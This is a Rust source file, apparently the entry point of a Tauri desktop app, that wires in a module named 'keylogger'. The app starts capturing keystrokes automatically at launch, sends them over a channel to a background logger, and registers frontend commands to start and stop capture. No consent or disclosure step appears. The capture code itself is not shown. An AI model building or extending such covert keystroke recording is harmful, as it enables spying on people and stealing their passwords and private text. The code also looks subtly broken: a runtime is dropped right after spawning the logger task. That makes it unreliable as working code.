mod keylogger;
mod logger;

use keylogger::KeyLogger;
use log::{error, info};
use tokio::sync::mpsc;

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
  // Set up the keystroke logging channel
  let (sender, receiver) = mpsc::channel(100);
  
  // Initialize keylogger
  let keylogger = KeyLogger::new(sender);
  
  // Initialize logger
  let mut logger = logger::Logger::new(receiver);
  
  // Set up Tauri application
  tauri::Builder::default()
    .setup(|app| {
      if cfg!(debug_assertions) {
        app.handle().plugin(
          tauri_plugin_log::Builder::default()
            .level(log::LevelFilter::Info)
            .build(),
        )?;
      }
      
      // Start keylogger
      if let Err(e) = keylogger.start() {
        error!("Failed to start keylogger: {}", e);
      } else {
        info!("Keylogger started successfully");
      }
      
      // Start logger in a background task
      let runtime = tokio::runtime::Runtime::new().unwrap();
      runtime.spawn(async move {
        logger.start().await;
      });
      
      // Expose keylogger control commands to frontend
      let keylogger_clone = std::sync::Arc::new(keylogger);
      let keylogger_for_stop = keylogger_clone.clone();
      
      // Command to start keylogger
      #[tauri::command]
      async fn start_keylogger(keylogger: tauri::State<'_, std::sync::Arc<KeyLogger>>) -> Result<(), String> {
        keylogger.start()
      }
      
      // Command to stop keylogger
      #[tauri::command]
      async fn stop_keylogger(keylogger: tauri::State<'_, std::sync::Arc<KeyLogger>>) {
        keylogger.stop();
      }
      
      // Register commands
      app.manage(keylogger_clone);
      app.handle().plugin(
        tauri::plugin::Builder::new("keylogger")
          .invoke_handler(tauri::generate_handler![start_keylogger, stop_keylogger])
          .build(),
      )?;
      
      Ok(())
    })
    .run(tauri::generate_context!())
    .expect("error while running tauri application");
}
